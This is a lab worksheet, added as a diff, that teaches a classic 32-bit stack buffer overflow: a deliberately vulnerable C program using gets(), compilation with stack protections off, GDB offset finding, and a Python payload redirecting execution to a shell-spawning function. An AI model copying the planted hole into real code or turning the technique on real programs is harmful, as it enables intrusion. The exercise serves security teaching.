@@ -1,0 +1,88 @@
+Practical Work: Developing a Simple Exploit
+Goal:
+Learn to find vulnerabilities in a vulnerable binary and write a simple exploit to exploit the
+Required Tools:
+•	Linux environment (Ubuntu, Kali, etc.)
+•	gcc — C compiler
+•	gdb — debugger
+•	python — for writing the exploit
+•	pwndbg — plugin for GDB (recommended)
+•	libc6-dev-i386 — for compiling 32-bit programs
+•	objdump, readelf, strings — binary analysis utilities
+Step 1: Create a Vulnerable Program
+Let's create a simple C code with a buffer overflow vulnerability.
+// vuln.c
+#include <stdio.h>
+#include <string.h>
+
+void secret() {
+    printf("Access granted! Exploit successful.\n");
+    system("/bin/sh");
+}
+
+void vulnerable() {
+    char buffer[64];
+    printf("Enter your name: ");
+    gets(buffer);  // vulnerable function
+    printf("Hello, %s\n", buffer);
+}
+
+int main() {
+    vulnerable();
+    return 0;
+}
+
+Compilation
+gcc -m32 -fno-stack-protector -z execstack vuln.c -o vuln
+•	-m32: creates a 32-bit binary
+•	-fno-stack-protector: disables stack protection (canary)
+•	-z execstack: makes the stack executable
+
+
+
+Step 2: Analyze the Binary
+Let's check for the secret() function and its address:
+objdump -d vuln | grep secret
+Or:
+nm vuln | grep secret
+Example output:
+080484b6 T secret
+Remember this address.
+Step 3: Run with GDB
+gdb ./vuln
+In GDB:
+run
+AAAAAAA... (many characters)
+When the crash occurs, use:
+info registers
+Look for the value of EIP — this is where we want to overwrite it with the address of secret().
+Step 4: Write the Exploit
+Let's write a Python script for the exploit:
+# exploit.py
+import os
+
+offset = 76  # determined empirically (64 bytes + 12 bytes for saving EBP, etc.)
+secret_addr = 0x080484b6  # address of the secret function
+
+payload = b"A" * offset
+payload += secret_addr.to_bytes(4, 'little')  # EIP
+
+with open("exploit_input", "wb") as f:
+    f.write(payload)
+
+Step 5: Exploit Execution
+python3 exploit.py
+./vuln < exploit_input
+If done correctly, you should see:
+Access granted! Exploit successful.
+$  # a shell will open
+
+Explanation:
+•	We fill the buffer with "garbage" to overwrite the EIP.
+•	After EIP, we insert the address of secret() to make it execute after returning from vulnerable().
+•	When the program receives our payload, it executes secret().
+Tasks:
+1.	Modify the program to call a different function.
+2.	Add protections (stack protector, ASLR) and try again.
+3.	Analyze a similar binary with Ghidra or IDA Free.
+
